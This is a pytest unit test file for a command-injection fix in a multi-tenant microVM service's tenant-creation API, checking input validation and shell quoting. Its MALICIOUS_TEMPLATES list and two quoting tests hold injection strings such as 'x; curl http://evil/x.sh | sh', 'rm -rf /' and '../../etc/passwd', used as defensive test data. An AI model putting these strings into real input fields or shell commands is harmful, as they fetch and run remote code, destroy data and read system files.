# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0

"""Unit tests for issue #59 — config_template command-injection defense.

`config_template` is caller-controlled (POST /tenants body) and, before this
fix, flowed UNQUOTED into an SSM AWS-RunShellScript command that runs as root
on a shared host (handler.py `_launch_vm` → `/home/ubuntu/launch-vm.sh ... {tpl_arg} ...`).
That is the strongest cross-tenant escape in the SECURITY-REVIEW (WI-E/M-1):
a value like `x; curl evil|sh` would execute arbitrary root commands on the
box hosting every tenant's microVM.

Its only legitimate use (launch-vm.sh:220) is as an S3 path slug:
    s3://$ASSETS_BUCKET/templates/openclaw/${CONFIG_TEMPLATE}/openclaw.json
so a template name is a DNS-label-shaped token. Defense is two-layer (DoD):

  1. INPUT validation — create_tenant rejects any config_template that isn't a
     safe DNS-label with 400 (defense at the edge, clear error to the caller).
  2. COMMAND construction — _launch_vm shell-quotes the positional args it
     interpolates, so even if a bad value ever reached this layer it cannot
     break out of its argument (defense in depth; also covers restore_backup_key).
"""

import importlib.util
import json
import shlex
import sys
from unittest.mock import MagicMock, patch

import pytest
from conftest import make_ddb_table

# ── Import handler with mocked AWS SDK (same seam as test_api.py) ──
_mock_ddb = MagicMock()
_mock_ssm = MagicMock()
_mock_s3 = MagicMock()
_mock_asg = MagicMock()
_mock_elbv2 = MagicMock()

with patch("boto3.resource", return_value=_mock_ddb), patch("boto3.client") as _mc:
    _mc.side_effect = lambda svc, **kw: {
        "ssm": _mock_ssm,
        "s3": _mock_s3,
        "autoscaling": _mock_asg,
        "elbv2": _mock_elbv2,
    }.get(svc, MagicMock())
    _mock_ddb.Table.side_effect = lambda name: make_ddb_table()
    spec = importlib.util.spec_from_file_location(
        "api_handler_injtest", "deploy/lambda/api/handler.py"
    )
    api = importlib.util.module_from_spec(spec)
    sys.modules["api_handler_injtest"] = api
    spec.loader.exec_module(api)


# Payloads that must NOT be accepted as a config_template. Each embeds a shell
# metacharacter that, unquoted, would break out of the launch-vm.sh argument.
MALICIOUS_TEMPLATES = [
    "x; curl http://evil/x.sh | sh",  # command chaining
    "x && rm -rf /data",  # logical-and chaining
    "$(reboot)",  # command substitution
    "`id`",  # backtick substitution
    "a b",  # whitespace splits into extra argv
    "../../etc/passwd",  # path traversal out of the templates/ prefix
    "a|b",  # pipe
    "a\nrm -rf /",  # newline injects a second command
    'a"b',  # quote to break out of a naive quoting attempt
    "a'b",
]


class TestConfigTemplateInputValidation:
    """Layer 1: create_tenant rejects unsafe config_template at the edge."""

    @pytest.mark.unit
    @pytest.mark.parametrize("payload", MALICIOUS_TEMPLATES)
    def test_malicious_config_template_rejected_400(self, payload):
        resp = api.create_tenant(
            json.dumps({"name": "victim", "config_template": payload})
        )
        assert resp["statusCode"] == 400, (
            f"injection payload {payload!r} was NOT rejected: {resp}"
        )

    @pytest.mark.unit
    def test_empty_config_template_allowed(self):
        # Empty is the common case (no custom template) and must stay valid;
        # it must NOT be rejected by the new validation.
        api.tenants_table = make_ddb_table()
        resp = api.create_tenant(json.dumps({"name": "normal", "config_template": ""}))
        assert resp["statusCode"] != 400

    @pytest.mark.unit
    @pytest.mark.parametrize("good", ["finance-agent", "openclaw", "tpl-v2", "a", "x1"])
    def test_valid_dns_label_template_accepted(self, good):
        api.tenants_table = make_ddb_table()
        resp = api.create_tenant(
            json.dumps({"name": "normal", "config_template": good})
        )
        assert resp["statusCode"] != 400, (
            f"legit template {good!r} was wrongly rejected: {resp}"
        )


class TestLaunchVmCommandQuoting:
    """Layer 2 (defense in depth): _launch_vm shell-quotes interpolated args.

    Even if a bad value bypassed layer 1, the emitted SSM command string must
    not let it break out of its positional argument. We assert the tokenized
    command keeps the payload as a single, inert token.
    """

    def _emit_command(self, **kw):
        """Call _launch_vm with SSM captured; return the command string sent."""
        api.ssm = MagicMock()
        api.ssm.send_command.return_value = {"Command": {"CommandId": "c-1"}}
        api._launch_vm(
            "i-host1",  # instance_id
            "tenant-1",  # tenant_id
            1,  # vm_num
            2,  # vcpu
            4096,  # mem_mb
            "172.16.0.2",  # guest_ip
            20001,  # host_port
            **kw,
        )
        assert api.ssm.send_command.called, "_launch_vm did not dispatch SSM"
        params = api.ssm.send_command.call_args.kwargs["Parameters"]
        return params["commands"][0]

    @pytest.mark.unit
    def test_config_template_cannot_break_out_of_argument(self):
        payload = "x; curl http://evil | sh"
        cmd = self._emit_command(config_template=payload)
        # The dangerous substring must survive only as ONE shlex token — i.e. it
        # is quoted, so `;` and `|` are literal, not shell operators.
        tokens = shlex.split(cmd.replace(" && ", " ").replace("&&", " "))
        assert payload in tokens, (
            f"config_template payload was not a single quoted token — injectable.\ncmd={cmd}"
        )

    @pytest.mark.unit
    def test_restore_backup_key_is_quoted(self):
        payload = "k; reboot"
        cmd = self._emit_command(restore_backup_key=payload)
        tokens = shlex.split(cmd.replace(" && ", " ").replace("&&", " "))
        assert payload in tokens, f"restore_backup_key injectable.\ncmd={cmd}"
